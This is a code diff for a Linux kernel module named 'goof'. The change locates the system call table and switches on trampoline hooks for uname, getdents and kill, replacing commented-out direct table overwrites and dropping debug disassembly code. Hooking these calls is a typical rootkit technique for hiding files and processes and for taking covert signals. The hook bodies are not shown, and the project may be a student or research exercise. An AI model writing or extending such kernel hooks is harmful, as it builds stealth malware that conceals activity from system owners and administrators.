@@ -424,31 +424,39 @@ goof_init(void) {
 
 	printk("[goof] module loaded\n");
 	
-	//Initialize disasm
-
 	hooks = kmalloc(sizeof(struct Hook *)*HOOKS_COUNT, GFP_KERNEL);
 
 	//Find base syscall address	
 	__sys_call_table = find(); 
 	printk("Found table\n");
-/*
+
 	//Update table with hooked code
-	//Regular way to hook syscall
-	original_uname = __sys_call_table[__NR_uname];
+	//Regular way to hook syscall:
+	//original_uname = __sys_call_table[__NR_uname];
 
-	DISABLE_W_PROTECTED_MEMORY
-	__sys_call_table[__NR_uname] = goofy_uname;
-	ENABLE_W_PROTECTED_MEMORY
+	//DISABLE_W_PROTECTED_MEMORY
+	//__sys_call_table[__NR_uname] = goofy_uname;
+	//ENABLE_W_PROTECTED_MEMORY
 
+
+	//Trampolining way to overwrite syscall:  
+	int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
+	printk("You will need to pad your hook to: %d bytes\n", padding_size);
+
+	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
 	printk("Hooked uname\n\n");
 
-	//Trampolining way to overwrite syscall  
-	//create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
-	//create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
+	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_getdents]);
+	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, padding_size);
+	printk("Hooked getdents\n\n");
 	
+	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_kill]);
+	create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, padding_size);
+	printk("Hooked kill\n\n");
+
 	//Waiting on LDE+ to create these into trampoline hooks
 	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
-	original_kill = __sys_call_table[__NR_kill];
+/*	original_kill = __sys_call_table[__NR_kill];
 
 	DISABLE_W_PROTECTED_MEMORY
 	__sys_call_table[__NR_kill] = goofy_kill;
@@ -458,34 +466,21 @@ goof_init(void) {
 
 	//original_open = __sys_call_table[__NR_open];
 	//__sys_call_table[__NR_open] = goofy_open;
-
+*/
 	//NO - waiting on an LDE @Scott Court
 	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
-	//Creating a new trampoline - DEBUG
-*/	
-/*	printk("[goof] DEBUG\n\n ");
-	//unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_uname];
-	MyDisasm.EIP = __sys_call_table[__NR_uname]; //(UIntPtr) ptr_tmp[i];
-	for(int i = 0; i < 5; i++){
-		len = Disasm(&MyDisasm);
-		printk("len: %d\n", len);
-		for(int j = 0; j < len; j++){
-			printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
-		}
-		MyDisasm.EIP = MyDisasm.EIP + len;
-		
-		printk("\n");
-	}
-*/
-	int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
-	printk("You will need to pad your hook to: %d\n", padding_size);
+	
+
+	//int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
+	//printk("You will need to pad your hook to: %d\n", padding_size);
 	return 0;
 }
 static void __exit
 goof_exit(void) {
 
-	//remove_tramp(0);
-	//remove_tramp(1);
+	remove_tramp(0);
+	remove_tramp(1);
+	remove_tramp(2);
 
 /*
 	DISABLE_W_PROTECTED_MEMORY
@@ -494,7 +489,6 @@ goof_exit(void) {
 	ENABLE_W_PROTECTED_MEMORY
 */	//__sys_call_table[__NR_open] = original_open;
 
-	//remove_tramp(2);
 	printk("[goof] module removed\n");
 	return;
 }
